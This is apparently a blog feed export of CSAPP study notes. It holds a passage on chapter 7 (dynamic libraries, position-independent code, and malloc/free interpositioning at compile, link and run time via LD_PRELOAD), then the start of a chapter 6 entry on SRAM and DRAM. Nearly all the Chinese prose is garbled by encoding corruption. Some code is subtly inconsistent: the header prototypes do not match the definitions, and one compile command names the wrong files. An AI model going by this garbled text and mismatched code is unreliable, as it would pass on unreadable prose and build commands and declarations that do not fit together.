è¡¨æ˜ç”ŸæˆåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œ`-fpic` å‚æ•°è¦æ±‚ç”Ÿæˆä½ç½®æ— å…³ä»£ç <br><br>![](/img/CSAPP-ç¬¬ä¸ƒç« -é“¾æ¥/<span class="hljs-number">7</span>-åŠ¨æ€é“¾æ¥åº“.png)<br><br>### ä»åº”ç”¨ç¨‹åºä¸­åŠ è½½å’Œé“¾æ¥å…±äº«åº“<br><br>åº”ç”¨ç¨‹åºå…è®¸å®ƒè¿è¡Œæ—¶è¦æ±‚åŠ¨æ€é“¾æ¥å™¨åŠ è½½å’Œé“¾æ¥æŸä¸ªå…±äº«åº“ï¼Œè€Œæ— éœ€åœ¨ç¼–è¯‘æ—¶å°†é‚£äº›åº“é“¾æ¥åˆ°åº”ç”¨ä¸­ã€‚<br><br>åŠ¨æ€é“¾æ¥æ˜¯ä¸€é¡¹å¼ºå¤§æœ‰ç”¨çš„æŠ€æœ¯ï¼Œæœ‰å¹¿æ³›çš„åº”ç”¨ï¼Œä¾‹å¦‚ï¼š<br><br>- åˆ†å‘è½¯ä»¶ï¼š<br><br>  å¾®è½¯ Windows åº”ç”¨çš„å¼€å‘è€…å¸¸å¸¸åˆ©ç”¨å…±äº«åº“æ¥åˆ†å‘è½¯ä»¶æ›´æ–°ã€‚ä»–ä»¬ç”Ÿæˆä¸€ä¸ªå…±äº«åº“çš„æ–°ç‰ˆæœ¬ï¼Œç„¶åç”¨æˆ·å¯ä»¥ä¸‹è½½ï¼Œå¹¶ç”¨å®ƒæ›¿ä»£å½“å‰çš„ç‰ˆæœ¬ã€‚ä¸‹ä¸€æ¬¡ä»–ä»¬è¿è¡Œåº”ç”¨ç¨‹åºæ—¶ï¼Œåº”ç”¨å°†è‡ªåŠ¨é“¾æ¥å’ŒåŠ è½½æ–°çš„å…±äº«åº“ã€‚<br><br>- æ„å»ºé«˜æ€§èƒ½ Web æœåŠ¡å™¨ï¼š<br><br>  æ—©æœŸçš„ Web æœåŠ¡å™¨é€šè¿‡ä½¿ç”¨ fork å’Œ execve åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¹¶åœ¨è¯¥å­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œ CGI ç¨‹åºæ¥ç”ŸæˆåŠ¨æ€å†…å®¹ã€‚ç°ä»£é«˜æ€§èƒ½çš„ Web æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨åŸºäºåŠ¨æ€æ¥çš„æ›´æœ‰æ•ˆå’Œå®Œå–„çš„æ–¹æ³•æ¥ç”ŸæˆåŠ¨æ€å†…å®¹ã€‚<br><br>å…¶æ€è·¯æ˜¯å°†æ¯ä¸ªç”ŸæˆåŠ¨æ€å†…å®¹çš„å‡½æ•°æ‰“åŒ…åœ¨å…±äº«åº“ä¸­ã€‚å½“ä¸€ä¸ªæ¥è‡ª Web æµè§ˆå™¨çš„è¯·æ±‚åˆ°è¾¾æ—¶ï¼ŒæœåŠ¡å™¨åŠ¨æ€åœ°åŠ è½½å’Œé“¾æ¥é€‚å½“çš„å‡½æ•°ï¼Œç„¶åç›´æ¥è°ƒç”¨å®ƒï¼Œè€Œä¸æ˜¯ä½¿ç”¨ fork å’Œ execve åœ¨å­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œå‡½æ•°ã€‚æ›´è¿›ä¸€æ­¥åœ°è¯´ï¼Œåœ¨è¿è¡Œæ—¶æ— éœ€åœæ­¢æœåŠ¡å™¨ï¼Œå°±å¯ä»¥æ›´æ–°å·²å­˜åœ¨çš„å‡½æ•°ï¼Œä»¥åŠæ·»åŠ æ–°çš„å‡½æ•°ã€‚<br><br>Linux ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæ¥å£â€”â€” `dlfcn.h` ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ–‡ä»¶ä¸­çš„ä¸€äº›å‡½æ•°æ¥å®æ—¶è·å–åŠ¨æ€é“¾æ¥åº“çš„å‡½æ•°ï¼Œä½¿ç”¨å‡½æ•°æŒ‡é’ˆæ¥æ”¶ã€‚<br><br><br><br># ä½ç½®æ— å…³ä»£ç <br><br>å¯ä»¥åŠ è½½è€Œæ— éœ€é‡å®šä½çš„ä»£ç ç§°ä¸º**ä½ç½®æ— å…³ä»£ç **ï¼ˆPosition-Independent Codeï¼ŒPICï¼‰ã€‚ç”¨æˆ·å¯¹ GCC ä½¿ç”¨ `-fpic` é€‰é¡¹æŒ‡ç¤º GNU ç¼–è¯‘ç³»ç»Ÿç”Ÿæˆ PIC ä»£ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å…±äº«åº“çš„ç¼–è¯‘å¿…é¡»æ€»æ˜¯ä½¿ç”¨è¯¥é€‰é¡¹ã€‚<br><br>æ— è®ºæˆ‘ä»¬åœ¨å†…å­˜ä¸­çš„ä½•å¤„åŠ è½½ä¸€ä¸ªç›®æ ‡æ¨¡å—ï¼ˆåŒ…æ‹¬å…±äº«ç›®æ ‡æ¨¡å—ï¼‰ï¼Œæ•°æ®æ®µä¸ä»£ç æ®µçš„è·ç¦»æ€»æ˜¯ä¿æŒä¸å˜ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯è¿ç”¨è¿™ä¸ªäº‹å®æ¥å£°ç§°å¯¹å…¨å±€å˜é‡çš„ PIC å¼•ç”¨çš„ã€‚<br><br>æˆ‘ä»¬ä½¿ç”¨ PLTï¼ˆè¿‡ç¨‹é“¾æ¥è¡¨ï¼‰å’Œ GOT ï¼ˆå…¨å±€åç§»é‡è¡¨ï¼‰æ¥å®ç°å»¶è¿Ÿç»‘å®šæœºåˆ¶ã€‚~~è¿™é‡Œä¸å¤šè¯´äº†~~<br><br><br><br># åº“æ‰“æ¡©æœºåˆ¶<br><br>åº“æ‰“æ¡©ï¼ˆlibrary interpositioningï¼‰å…è®¸ä½¿ç”¨è€…æˆªè·å¯¹å…±äº«åº“å‡½æ•°çš„è°ƒç”¨ï¼Œå–è€Œä»£ä¹‹æ‰§è¡Œè‡ªå·±çš„ä»£ç ã€‚ä½¿ç”¨æ‰“æ¡©æœºåˆ¶ï¼Œå¯ä»¥è¿½è¸ªå¯¹æŸä¸ªç‰¹æ®Šåº“å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°ï¼ŒéªŒè¯å’Œè¿½è¸ªå®ƒçš„è¾“å…¥å’Œè¾“å‡ºå€¼ï¼Œæˆ–è€…ç”šè‡³æŠŠå®ƒæ›¿æ¢æˆä¸€ä¸ªå®Œå…¨ä¸åŒçš„å®ç°ã€‚<br><br>æ‰“æ¡©æœºåˆ¶çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼š<br><br>ç»™å®šä¸€ä¸ªéœ€è¦æ‰“æ¡©çš„ç›®æ ‡å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªåŒ…è£…å‡½æ•°ï¼Œå®ƒçš„åŸå‹ä¸ç›®æ ‡å‡½æ•°å®Œå…¨ä¸€æ ·ã€‚ä½¿ç”¨æŸç§ç‰¹æ®Šçš„æ‰“æ¡©æœºåˆ¶ï¼Œä½ å°±å¯ä»¥æ¬ºéª—ç³»ç»Ÿè°ƒç”¨åŒ…è£…å‡½æ•°è€Œä¸æ˜¯ç›®æ ‡å‡½æ•°äº†ã€‚åŒ…è£…å‡½æ•°é€šå¸¸ä¼šæ‰§è¡Œå®ƒè‡ªå·²çš„é€»è¾‘ï¼Œç„¶åè°ƒç”¨æœˆæ ‡å‡½æ•°ï¼Œå†å°†æ—¥æ ‡å‡½æ•°çš„è¿”å›å€¼ä¼ é€’ç»™è°ƒç”¨è€…ã€‚<br><br>### ç¼–è¯‘æ—¶æ‰“æ¡©<br><br>å…ˆå‡†å¤‡ä¸‹é¢ä¸‰ä¸ªæ–‡ä»¶ï¼š<br><br><span class="hljs-built_in">malloc</span>.hï¼š<br><br>```C<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> malloc mymalloc</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> free myfree</span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mymalloc</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">myfree</span><span class="hljs-params">(<span class="hljs-type">void</span> *)</span>;<br></code></pre></td></tr></table></figure><p>malloc.cï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> COMPILETIME</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-comment">/* malloc wrapper function */</span><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mymalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> * ptr = <span class="hljs-built_in">malloc</span>(size); <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(%d)=%p\n&quot;</span>,(<span class="hljs-type">int</span>)size, ptr); <br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-comment">/* free wrapper function */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">myfree</span><span class="hljs-params">(<span class="hljs-type">void</span> * ptr)</span><br>&#123;<br>    <span class="hljs-built_in">free</span> (ptr); <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free(%p)\n&quot;</span>, ptr);<br>&#125;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æƒ³è¦ <code>mymalloc.c</code> ä¸­çš„åŒ…è£…å‡½æ•°è°ƒç”¨ç›®æ ‡å‡½æ•°ï¼Œæ‰“å°è¿½è¸ªè®°å½•ï¼Œå¹¶è¿”å›ã€‚åªéœ€è¦åƒä¸‹é¢è¿™ä¸¤æ¡å‘½ä»¤ä¸€æ ·ç¼–è¯‘ç¨‹åºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -I.-o intc int.c mymalloc.o<br></code></pre></td></tr></table></figure><p>ç”±äºæœ‰ <code>-I</code>å‚æ•°ï¼Œæ‰€ä»¥ä¼šè¿›è¡Œæ‰“æ¡©ï¼Œå®ƒå‘Šè¯‰ C é¢„å¤„ç†å™¨åœ¨æœç´¢é€šå¸¸çš„ç³»ç»Ÿç›®å½•ä¹‹å‰,å…ˆåœ¨å½“å‰ç›®å½•ä¸­æŸ¥æ‰¾ <code>malloc.h</code>ã€‚</p><h3 id="é“¾æ¥æ—¶æ‰“æ¡©"><a href="#é“¾æ¥æ—¶æ‰“æ¡©" class="headerlink" title="é“¾æ¥æ—¶æ‰“æ¡©"></a>é“¾æ¥æ—¶æ‰“æ¡©</h3><p>æˆ‘ä»¬è°ƒç”¨ <code>-wrap f</code> æ ‡å¿—è¿›è¡Œé“¾æ¥æ—¶æ‰“æ¡©ã€‚</p><p>é“¾æ¥æ—¶åº“æ‰“æ¡©ä¸èƒ½è‡ªå®šä¹‰è°ƒç”¨åï¼Œåœ¨æˆ‘ä»¬è‡ªå·±å†™çš„æ¨¡å—ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰çš„å‡½æ•°å¿…é¡»æ˜¯ <code>__wrap_xxx</code> ï¼Œæ¯”å¦‚ <code>__wrap_malloc</code> ï¼Œæˆ‘ä»¬åœ¨ <code>__wrap_malloc</code> ä¸­è°ƒç”¨çœŸå®çš„ <code>malloc</code> è¦å†™æˆ <code>__real_malloc</code> å»è°ƒç”¨ã€‚</p><p>æˆ‘ä»¬åœ¨ malloc å’Œ free ä¸¤ä¸ªå‡½æ•°æ‰“æ¡©ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -Wl,--wrap,malloc -Wl,--wrap,free -o a.out main.o malloc.o<br></code></pre></td></tr></table></figure><p>æ¯ä¸ª <code>-Wl,--wrap,xxx</code> å°±è¡¨ç¤ºä½¿ç”¨ <code>__wrap_xxx</code> å‡½æ•°å»æ›¿æ¢ <code>xxx</code> å‡½æ•°ã€‚</p><h3 id="è¿è¡Œæ—¶æ‰“æ¡©"><a href="#è¿è¡Œæ—¶æ‰“æ¡©" class="headerlink" title="è¿è¡Œæ—¶æ‰“æ¡©"></a>è¿è¡Œæ—¶æ‰“æ¡©</h3><p>ç¼–è¯‘æ—¶æ‰“æ¡©éœ€è¦èƒ½å¤Ÿè®¿é—®ç¨‹åºçš„æºä»£ç ï¼Œé“¾æ¥æ—¶æ‰“æ¡©éœ€è¦èƒ½å¤Ÿè®¿é—®ç¨‹åºçš„å¯é‡å®šä½å¯¹è±¡æ–‡ä»¶ã€‚ä¸è¿‡ï¼ŒåŸºäºåŠ¨æ€é“¾æ¥å™¨çš„ LD_PRELOAD ç¯å¢ƒå˜é‡æœºåˆ¶èƒ½å¤Ÿåœ¨è¿è¡Œæ—¶æ‰“æ¡©ï¼Œå®ƒåªéœ€è¦èƒ½å¤Ÿè®¿é—®å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚</p><blockquote><p>å¦‚æœ LD_PRELOAD ç¯å¢ƒå˜é‡è¢«è®¾ç½®ä¸ºä¸€ä¸ªå…±äº«åº“è·¯å¾„åçš„åˆ—è¡¨(ä»¥ç©ºæ ¼æˆ–åˆ†å·åˆ†éš”),é‚£ä¹ˆå½“ä½ åŠ è½½å’Œæ‰§è¡Œä¸€ä¸ªç¨‹åºï¼Œéœ€è¦è§£ææœªå®šä¹‰çš„å¼•ç”¨æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ï¼ˆLD-LINUX.SOï¼‰ä¼šå…ˆæœç´¢ LD_PRELOAD åº“ï¼Œç„¶åæ‰æœç´¢ä»»ä½•å…¶ä»–çš„åº“ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//malloc.c</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><span class="hljs-comment">/* malloc wrapper function */</span><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> *(* mallocp) (<span class="hljs-type">size_t</span> size); <br>    mallocp = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;malloc&quot;</span>); <span class="hljs-comment">/* Get address of libc malloc */</span><br>    <span class="hljs-type">char</span> * ptr = mallocp(size); <span class="hljs-comment">/* Call libc malloc */</span><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*freep) (<span class="hljs-type">void</span> *) = <span class="hljs-literal">NULL</span>; <br>    <span class="hljs-keyword">if</span> (!ptr)<br>        <span class="hljs-keyword">return</span>; <br>    freep = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;free&quot;</span>); <span class="hljs-comment">/* Get address of libc free:*/</span> <br>    freep(ptr); <span class="hljs-comment">/* Call libc free */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free(%p)\n&quot;</span>, ptr);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤ <code>gcc malloc.c -o malloc.so -ldl -shared -fPIC</code> ç¼–è¯‘å¾—åˆ° <code>.so</code> åº“ã€‚</p><p>ç„¶åä½¿ç”¨å‘½ä»¤ <code>LD_PRELOAD=&quot;./malloc.so&quot; ./xxxx</code> æ¥è¿è¡Œæ—¶åŠ è½½ <code>malloc.so</code> è¿›è¡Œæ‰“æ¡©ã€‚</p><h1 id="å¤„ç†ç›®æ ‡æ–‡ä»¶çš„å·¥å…·"><a href="#å¤„ç†ç›®æ ‡æ–‡ä»¶çš„å·¥å…·" class="headerlink" title="å¤„ç†ç›®æ ‡æ–‡ä»¶çš„å·¥å…·"></a>å¤„ç†ç›®æ ‡æ–‡ä»¶çš„å·¥å…·</h1><ul><li>arï¼šåˆ›å»ºé™æ€åº“ï¼Œæ’å…¥ã€åˆ é™¤ã€åˆ—å‡ºå’Œæå–æˆå‘˜ã€‚</li><li>stringsï¼šåˆ—å‡ºä¸€ä¸ªç›®æ ‡æ–‡ä»¶ä¸­æ‰€æœ‰å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚</li><li>stripï¼šä»ç›®æ ‡æ–‡ä»¶ä¸­åˆ é™¤ç¬¦å·è¡¨ä¿¡æ¯ã€‚</li><li>nmï¼šåˆ—å‡ºä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­å®šä¹‰çš„ç¬¦å·ã€‚</li><li>sizeï¼šåˆ—å‡ºç›®æ ‡æ–‡ä»¶ä¸­èŠ‚çš„åå­—å’Œå¤§å°ã€‚</li><li>readelfï¼šæ˜¾ç¤ºä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„å®Œæ•´ç»“æ„ï¼ŒåŒ…æ‹¬ELFå¤´ä¸­ç¼–ç çš„æ‰€æœ‰ä¿¡æ¯ã€‚åŒ…å« SIZE å’Œ NM çš„åŠŸèƒ½ã€‚</li><li>objdumpï¼šæ‰€æœ‰äºŒè¿›åˆ¶å·¥å…·ä¹‹æ¯ã€‚èƒ½å¤Ÿæ˜¾ç¤ºä¸€ä¸ªç›®æ ‡æ–‡ä»¶ä¸­æ‰€æœ‰çš„ä¿¡æ¯ã€‚å®ƒæœ€å¤§å‹ºä½œç”¨æ˜¯åæ±‡ç¼–.textèŠ‚ä¸­çš„äºŒè¿›åˆ¶æŒ‡ä»¤ã€‚</li><li>lddï¼šåˆ—å‡ºä¸€ä¸ªåŠ¨æ€é“¾æ¥ ELF æ–‡ä»¶çš„é“¾æ¥åº“</li></ul><blockquote><p>é‚£äº›æ²¡æœ‰ç¬¦å·è¡¨çš„é¢˜ç›®æ˜¯ä¸æ˜¯å°±æ˜¯ç”¨äº† strip å‘½ä»¤ï¼</p></blockquote><hr><p>è¿™é‡Œçš„çŸ¥è¯†éƒ½æ˜¯å­¦è¿‡çš„ï¼Œæ‰€ä»¥è¿›è¡Œèµ·æ¥æ¯”è¾ƒå¿«</p><p>æ‰“æ¡©æ˜¯æ–°çŸ¥è¯†ï¼æ„Ÿè§‰å¾ˆç¥å¥‡ï¼ğŸ¤—</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬å…­ç«  å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„</title>
    <link href="/2023/11/25/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <url>/2023/11/25/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>å­˜å‚¨å™¨ç³»ç»Ÿå„å±‚çš„åŸç†å’Œå±æ€§</p><span id="more"></span><p>åœ¨å¯¹ç³»ç»Ÿçš„ç ”ç©¶å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å‡å®šäº†ä¸€ä¸ªç®€å•çš„è®¡ç®—æœºç³»ç»Ÿæ¨¡å‹ï¼ŒCPU æ‰§è¡ŒæŒ‡ä»¤ï¼Œè€Œå­˜å‚¨å™¨ç³»ç»Ÿä¸º CPU å­˜æ”¾æŒ‡ä»¤å’Œæ•°æ®ã€‚åœ¨ç®€å•æ¨¡å‹ä¸­ï¼Œå­˜å‚¨å™¨ç³»ç»Ÿæ˜¯ä¸€ä¸ªçº¿æ€§çš„å­—èŠ‚æ•°ç»„ï¼Œè€Œ CPUèƒ½å¤Ÿåœ¨ä¸€ä¸ªå¸¸æ•°æ—¶é—´å†…è®¿é—®æ¯ä¸ªå­˜å‚¨å™¨ä½ç½®ã€‚</p><p>å®é™…ä¸Šï¼Œå­˜å‚¨å™¨ç³»ç»Ÿ (memory systcm) æ˜¯ä¸€ä¸ªå…·æœ‰ä¸åŒå®¹é‡ã€æˆæœ¬å’Œè®¿é—®æ—¶é—´çš„å­˜å‚¨è®¾å¤‡çš„<strong>å±‚æ¬¡ç»“æ„</strong>ã€‚CPU å¯„å­˜å™¨ä¿å­˜ç€æœ€å¸¸ç”¨çš„æ•°æ®ã€‚è¶Šé è¿‘ CPU çš„å­˜å‚¨å™¨è¯»å†™é€Ÿåº¦è¶Šå¿«ï¼Œå®¹é‡è¶Šå°ã€‚</p><h1 id="å­˜å‚¨æŠ€æœ¯"><a href="#å­˜å‚¨æŠ€æœ¯" class="headerlink" title="å­˜å‚¨æŠ€æœ¯"></a>å­˜å‚¨æŠ€æœ¯</h1><p>åŸºæœ¬çš„å­˜å‚¨æŠ€æœ¯æœ‰ï¼šSRAM å­˜å‚¨å™¨ã€DRAM å­˜å‚¨å™¨ã€ROMå­˜å‚¨å™¨ä»¥åŠæ—‹è½¬çš„å’Œå›ºæ€çš„ç¡¬ç›˜</p><h3 id="éšæœºè®¿é—®å­˜å‚¨å™¨"><a href="#éšæœºè®¿é—®å­˜å‚¨å™¨" class="headerlink" title="éšæœºè®¿é—®å­˜å‚¨å™¨"></a>éšæœºè®¿é—®å­˜å‚¨å™¨</h3><p>éšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆRandom-Access Memoryï¼ŒRAMï¼‰åˆ†ä¸ºä¸¤ç±»ï¼šé™æ€çš„å’ŒåŠ¨æ€çš„ã€‚å…¶ä¸­é™æ€ RAMï¼ˆSRAMï¼‰æ¯”åŠ¨æ€çš„ï¼ˆDRAMï¼‰æ›´å¿«ï¼Œä½†ä¹Ÿæ›´è´µã€‚</p><p>SRAM ç”¨æ¥ä½œä¸ºé«˜é€Ÿç¼“å­˜å­˜å™¨ï¼Œæ—¢å¯ä»¥åœ¨ CPU èŠ¯ç‰‡ä¸Šï¼Œä¹Ÿå¯ä»¥åœ¨ç‰‡ä¸‹ã€‚DRAM ç”¨æ¥ä½œä¸ºä¸»å­˜ä»¥åŠå›¾å½¢ç³»ç»Ÿçš„å¸§ç¼“å†²åŒºã€‚</p><h4 id="é™æ€RAMï¼ˆSRAMï¼‰"><a href="#é™æ€RAMï¼ˆSRAMï¼‰" class="headerlink" title="é™æ€RAMï¼ˆSRAMï¼‰"></a>é™æ€RAMï¼ˆSRAMï¼‰</h4><p>SRAM å°†æ¯ä¸ªä½å­˜å‚¨åœ¨ä¸€ä¸ª<strong>åŒç¨³æ€</strong>çš„ï¼ˆbistableï¼‰å­˜å‚¨å™¨å•å…ƒé‡Œã€‚å®ƒçš„å±æ€§æ˜¯ï¼šå¯ä»¥æ— é™æœŸåœ°ä¿æŒåœ¨ä¸¤ä¸ªä¸åŒçš„ç”µå‹é…ç½®(configuration)æˆ–çŠ¶æ€(state)ä¹‹ä¸€ï¼Œå…¶ä»–ä»»ä½•çŠ¶æ€éƒ½æ˜¯ä¸ç¨³å®šçš„ã€‚</p><p>å¦‚ä¸‹å›¾ï¼šä¸­é—´å›¾çš„çŠ¶æ€è™½ç„¶å¯ä»¥ä¿æŒï¼Œä½†å®é™…ä¸Šæ˜¯äºšç¨³æ€çš„â€”â€”åªè¦æœ‰ç»†å¾®çš„æ‰°åŠ¨å°±ä¼šç ´åå®ƒæ‰€è°“çš„ç¨³æ€ï¼Œæœ€åéƒ½ä¼šè¶‹äºæœ€å·¦æˆ–æœ€å³çš„çŠ¶æ€ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-SRAM%E5%8F%8C%E7%A8%B3%E6%80%81.png"></p><p>ç”±äº SRAM å­˜å‚¨å™¨å•å…ƒçš„åŒç¨³æ€ç‰¹æ€§ï¼Œåªè¦æœ‰ç”µï¼Œå®ƒå°±ä¼šæ°¸è¿œåœ°ä¿æŒå®ƒçš„å€¼ã€‚å³ä½¿æœ‰å¹²æ‰°ï¼ˆä¾‹å¦‚ç”µå­å™ªéŸ³ï¼‰æ¥æ‰°ä¹±ç”µå‹ï¼Œå½“å¹²æ‰°æ¶ˆé™¤æ—¶ï¼Œç”µè·¯å°±ä¼šæ¢å¤åˆ°ç¨³å®šå€¼ã€‚</p><h4 id="åŠ¨æ€RAMï¼ˆDRAMï¼‰"><a href="#åŠ¨æ€RAMï¼ˆDRAMï¼‰" class="headerlink" title="åŠ¨æ€RAMï¼ˆDRAMï¼‰"></a>åŠ¨æ€RAMï¼ˆDRAMï¼‰</h4><p>DRAM å°†æ¯ä¸ªä½å­˜å‚¨ä¸ºå¯¹ä¸€ä¸ªç”µå®¹çš„å……ç”µã€‚ä¸ SRAM ä¸åŒï¼ŒDRAM å­˜å‚¨å™¨å•å…ƒå¯¹å¹²æ‰°éå¸¸æ•æ„Ÿã€‚å½“ç”µå®¹çš„ç”µå‹è¢«æ‰°ä¹±ä¹‹åï¼Œå®ƒå°±æ°¸è¿œä¸ä¼šæ¢å¤äº†ã€‚</p><p>ä¼šæœ‰å¾ˆå¤šåŸå› å¯¼è‡´ DRAM æ¼ç”µï¼Œä½¿å¾— DRAM å•å…ƒåœ¨ 10~100 æ¯«ç§’æ—¶é—´å†…å¤±å»ç”µè·ã€‚ä½†æ˜¯å› ä¸ºè¿™æ—¶é—´è¿˜æ˜¯è¶³å¤Ÿé•¿çš„ï¼Œæˆ‘ä»¬å¯ä»¥å‘¨æœŸæ€§åœ°é‡å†™æ¥åˆ·æ–°æ¯ä¸€ä½ï¼Œæˆ–è€…ä½¿ç”¨çº é”™ç å‘ç°æ¯ä¸ªå•å…ƒçš„é”™è¯¯ä½ã€‚</p><p>ä¸‹è¡¨å±•ç¤ºäº† SRAM å’Œ DRAM çš„ç‰¹æ€§ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-SRAM-DRAM%E5%AF%B9%E6%AF%94.png"></p><h4 id="ä¼ ç»Ÿçš„DRAM"><a href="#ä¼ ç»Ÿçš„DRAM" class="headerlink" title="ä¼ ç»Ÿçš„DRAM"></a>ä¼ ç»Ÿçš„DRAM</h4><p>DRAM èŠ¯ç‰‡ä¸­çš„å•å…ƒï¼ˆä½ï¼‰è¢«åˆ†æˆ d ä¸ªè¶…å•å…ƒï¼ˆsupercellï¼‰ï¼Œæ¯ä¸ªè¶…å•å…ƒéƒ½ç”± w ä¸ª DRAM å•å…ƒç»„æˆã€‚</p><p>å¦‚ä¸‹å›¾å±•ç¤ºçš„æ˜¯ä¸€ä¸ª 16X8 çš„ DRAM 